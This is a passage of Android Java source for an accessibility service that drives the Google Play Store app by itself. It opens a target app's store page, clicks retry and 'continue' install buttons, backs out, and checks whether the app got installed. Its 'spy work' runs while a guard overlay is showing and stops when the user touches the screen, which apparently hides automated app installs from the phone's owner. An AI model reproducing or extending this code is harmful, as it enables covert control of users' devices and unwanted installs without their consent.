                            nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getMainBarResId());
                            if (nodes != null && nodes.size() > 0) {
                                mIsTimeOut = false;
                                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "当前处于首页，需要重新进入");
                                if (sRetryTime > 0) {
                                    AppUtil.jumpToStore(StaticConst.sContext, StalkerManager.get().pCurrentWorkInfo
                                            .pkg);
                                } else {
                                    StalkerManager.get().doNextStartAfterError(0, "打开详情页失败");
                                }

                            } else {
                                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "当前在加载中，需要等待！");
                                // 进行超时判断
                                mIsTimeOut = true;
                                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "进行超时判断，30秒");
                                mHandler.postDelayed(mTimeOutRunnable, 30 * 1000);
                            }
                        }
                    } else if (sCurrentWorkState == 1) {
                        // 当前正在监听下载
                        AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "非通知栏事件，监测下载中，现在要监测任务是否完成");
                        if (GPResId.PACKAGE.equals(event.getPackageName().toString())) {
                            performGlobalBack();
                        }
                        spyIsAppInstalled(event);
                    } else if (sCurrentWorkState == 3) {
                        nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getContinueBarId());
                        AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "当前处于应用详情页界面，工作状态3，判断是否有继续按钮： " + nodes);
                        AccessibilityNodeInfo info;
                        if (nodes != null && nodes.size() > 0) {
                            nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getContinueBtnId());
                            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "找到继续按钮的界面，查找继续的确认按钮" + nodes);
                            if (nodes != null && nodes.size() > 0) {
                                info = nodes.get(0);
                                boolean result = info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "找到继续安装按钮，执行安装程序! class = " + info
                                        .getClassName() + ", " +
                                        "isClickable = " + info.isClickable()
                                        + ", click result = " + result);
                                if (result) {
                                    // 执行成功，退出GP
                                    sCurrentWorkState = 1;
                                    performGlobalBack();
                                }
                            }
                        }
                    }

                }
            }
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
    private boolean isHandleRetry(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
                && GPResId.PACKAGE.equals(event.getPackageName().toString())) {
            AccessibilityNodeInfo source = getRootInActiveWindow();
            if (source != null) {
                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "开始检查是否有重试按钮");
                List<AccessibilityNodeInfo> nodes = source.findAccessibilityNodeInfosByViewId(GPResId
                        .getErrorRetryResId());
                if (nodes != null && nodes.size() > 0) {
                    AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "当前打开GP失败，出现网络错误情况，判断并执行重试!");
                    if (sRetryTime > 0) {
                        sRetryTime--;
                        AccessibilityNodeInfo info = nodes.get(0);
                        if (info != null) {
                            boolean result = info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            if (result) {
                                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "执行重试成功，重试中");
                                return true;
                            }
                        }
                    }
                    AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "重试操作执行失败，关闭退出GP，提前结束执行操作");
//                    performGlobalBack();
                    // 退出执行
                    StalkerManager.get().doNextStartAfterError(0, "重试超时失败");
                    return true;
                }
            }
        }
        return false;
    }

    private void spyIsAppInstalled(AccessibilityEvent event) {
//        if (event.getText() != null && event.getText().size() > 0 && event.getText().get(0) != null
//                && event.getText().get(0).toString().contains(TEST_APP_NAME)
//                && GPResId.PACKAGE.equals(event.getPackageName().toString())) {
        if (GPResId.PACKAGE.equals(event.getPackageName().toString())) {
            // 当前正在安装或者已经安装完成，判断app是否安装
            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "当前正在安装或者已经安装完成，判断app是否安装");
            if (AppUtil.isPkgInstalled(this, StalkerManager.get().pCurrentWorkInfo.pkg)) {
                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "应用已经安装，修改工作状态");
                StalkerManager.get().doContinueAfterInstalled();
            }
        }
    }

    private AccessibilityNodeInfo travsalToFindFirstInfoContainsName(AccessibilityNodeInfo info, String widgetName,
                                                                     String text) {
        if (info == null)
            return null;
        if ((TextUtils.isEmpty(widgetName) || info.getClassName().toString().contains(widgetName))
                && (TextUtils.isEmpty(text) || (info.getText() != null && info.getText().toString().contains(text)))) {
            return info;
        } else if (info.getChildCount() > 0) {
            AccessibilityNodeInfo result;
            for (int i = 0; i < info.getChildCount(); i++) {
                result = travsalToFindFirstInfoContainsName(info.getChild(i), widgetName, text);
                if (result != null)
                    return result;
            }
        }
        return null;
    }

    private void performGlobalBack() {
        mHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
            }
        }, 200);
    }

    private boolean traveselNodeInfo(AccessibilityNodeInfo info, int depth) {
        StringBuilder spaceCount = new StringBuilder();
        int d = depth;
        while (d-- > 0) {
            spaceCount.append("--");
        }
        if (info != null) {
            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, spaceCount.toString() + "info.class = " + info.getClassName
                    () + ", getChildCount = " +
                    info.getChildCount()
                    + ", label = " + info.getText() + ", packageName = " + info.getPackageName() + ", isClick = " +
                    info.isClickable() + ", isEnabled = " + info.isEnabled()
                    + ", windowId = " + info.getWindowId());
            if (info.getChildCount() != 0) {
                for (int i = 0; i < info.getChildCount(); i++) {
                    if (traveselNodeInfo(info.getChild(i), depth + 1)) {
                        info.recycle();
                        return true;
                    }
                }
            }
            info.recycle();
        } else {
            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, spaceCount.toString() + "null");
        }
        return false;
    }

    @Override
    public void onInterrupt() {
        AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "NBAccessibilityService.onInterrupt!");
    }

    @Override
    public void onGuardShow() {
        // 该线程模拟网络请求
        StalkerManager.get().startSpyWork();
    }

    @Override
    public void onGuardTouch(float offset) {
//        AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "接收到onGuardTouch事件，停止任务，进行下一次监听是否开启");
//        if (finalWindowStateChangeEvent != null
//                && finalWindowStateChangeEvent.getPackageName() != null
//                && GPResId.PACKAGE.equals(finalWindowStateChangeEvent.getPackageName().toString())) {
//            performGlobalBack();
//        } else {
//            AppUtil.jumpToHome(StaticConst.sContext);
//        }
//        finalWindowStateChangeEvent = null;
        StalkerManager.get().stopAndWaitStartSpyWork();
    }

    @Override
    public void onGuardHide() {
        AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "接收到onGuardHide事件");
        StalkerManager.get().stopSpyWork();
    }
}
